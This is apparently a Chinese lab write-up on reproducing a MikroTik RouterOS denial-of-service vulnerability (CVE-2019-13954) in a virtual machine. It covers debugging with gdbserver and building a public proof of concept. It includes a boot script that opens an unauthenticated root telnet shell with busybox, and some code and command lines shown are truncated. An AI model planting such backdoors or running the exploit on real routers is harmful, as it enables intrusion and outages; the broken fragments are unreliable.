            }
            catch (const std::exception& e)
            {
                std::cerr ());
                p_ip.assign(argv_map["ip"].as());
                p_port.assign(argv_map["port"].as());
                if (argv_map.count("password"))
                {
                    p_password.assign(argv_map["password"].as());
                }
                else
                {
                    p_password.assign("");
                }
                return true;
            }
            else
            {
                std::cerr  /proc/sys/kernel/randomize_va_space"`
通过后门busybox登陆routeros，查看www的进程pid后，开启gdbserver附加www
开启gdb，准备调试，设置架构为i386，目标主机为192.168.0.113，端口为1234
`set architecture i386`
`target remote 192.168.0.113:1234`
同时本地运行POC，`info proc mappings`查看当前已经加载的模块，但是没发现有关jsproxy的模块
对www模块进行断点，然后s几下便发现jsproxy.p出来了
在ida中找到要断点的函数的偏移地址，从doUpload函数断点，偏移量为8D08
将mappings中jsproxy的基地址加上偏移地址就ok了，对其断点
接下里我们可以通过对sub_51F7下断点，然后c几次，再取消断点运行看是否会使系统重启
Sub_51F7的地址为0x77540000+0x51F7，c几次会一直执行
将断点删除后，发现系统重启了，成功验证该漏洞！
## 漏洞环境搭建过程
###  RouterOS环境搭建
因为CVE-2019-13954跟CVE-2018-1157原理类似，可以顺便也了解下，可以选择同时下载两个版本，都验证一下
CVE-2018-1157可在系统版本6.40.5验证
CVE-2019-13954可在系统版本6.42.11验证
MikroTik RouterOS镜像下载地址：
虚拟机安装镜像，按a，选择所有，然后i安装，后续都默认y就行
用户名是admin，密码为空，下图说明成功安装
把虚拟机改成桥接模式
虚拟机获取ip
`ip dhcp-client add interface=ether disabled=no`
查看虚拟机获取的ip
`ip dhcp-client print detail`
测试是否能ping通，测试ok
我们需要下载busybox（用于开root后门）、gdbserver.i686（远程调试）
busybox：`wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox`
**busybox使静态编译的，不依赖于系统的动态链接库，从而不受ld.so.preload的劫持，能够正常操作文件。系统在执行程序的时候，会通过环境变量LD_PRELOAD和配置文件/etc/ld.so.preload进行预加载从而调用动态链接库，如果这两者被修改的话，那么系统程序在执行的时候，就会调用这两者被修改的内容。**
除了busybox，我们还可以通过[https://github.com/tenable/routeros下的**cleaner_wrasse**利用漏洞开启后门](https://github.com/tenable/routeros%E4%B8%8B%E7%9A%84**cleaner_wrasse**%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%90%AF%E5%90%8E%E9%97%A8)
gdbserver.i686下载地址：
下载后，我们还需要一个LiveDVD的linux系统镜像，用来挂载RouterOS的文件系统，并上传和改写文件
CentOS-6.10-x86-64-LiveDVD下载地址：
在虚拟机设置CD/DVD驱动器为上面下载的CentOS的镜像
在启动磁盘这选择CD/DVD，并重新启动
如果启动非常慢，可以在虚拟机设置里，把CPU的核心和内存分配多点，这样运行快些
如果可以看到有rw这个文件夹，说明挂载成功了
进入rw文件夹，打开终端，进入root权限，如果disk是绿色的说明没有损坏，我有一次是红色的，如果也出现跟我类似的情况就重装一次RouterOS就行
进入disk文件夹，因为我已经下过了，并且把busybox-i686和gdbserver.i686都放到自己的服务器上了，所以我这里就直接用scp从服务器上下载下来
别忘了给权限
最后我们还需要在/rw目录下编写一个DEFCONF脚本，用来使RouterOS开机运行后门，RouterOS每次开机都会运行DEFCONF这个文件，但是重启之后会没了，不想麻烦的，可以开个快照
`ok; /rw/disk/busybox-i686 telnetd -l /bin/bash -p 1270;`
在虚拟机里从硬盘重启RouterOS，重启后在要输入账号的时候出现下面这样，说明busybox的后门成功开启了
此时，我们可以不通过用户名和密码就在ubuntu中直接telnet远程登陆RouterOS了
`telnet ip port`
###  漏洞文件获取
在通过后门登陆后，查看www和jsproxy.p所在的位置
这里可以通过工具[Chimay-Red](https://github.com/BigNerd95/Chimay-Red)从官网上提取6.40.5和6.42.11版本的www、jsproxy.p
`./tools/getROSbin.py 6.40.5 x86 /nova/bin/www www_binary`
`./tools/getROSbin.py 6.42.11 x86 /nova/bin/www www_binary_2`
###  编译生成POC
依赖环境:
  * Boost 1.66 or higher
  * cmake （我ubuntu有装过，就不再装了）
安装Boost：
Ubuntu：
`sudo apt-get install libboost-dev`
测试代码：
    #include 
    #include
    #include
    using namespace std;
    int main() {
        cout << BOOST_VERSION << endl;
        cout << BOOST_LIB_VERSION << endl;
        cout << BOOST_PLATFORM << endl;
        cout << BOOST_COMPILER << endl;
        cout << BOOST_STDLIB << endl;
      return 0;
    }
如果能运行并且出现下面的信息，说明成功
POC编译的环境以及其他要用到的脚本文件
`git clone https://github.com/tenable/routeros.git`
编译生成cve_2019_13954的poc
`cd cve_2019_13954`
`mkdir build`
`cd build`
`cmake ..`
`make`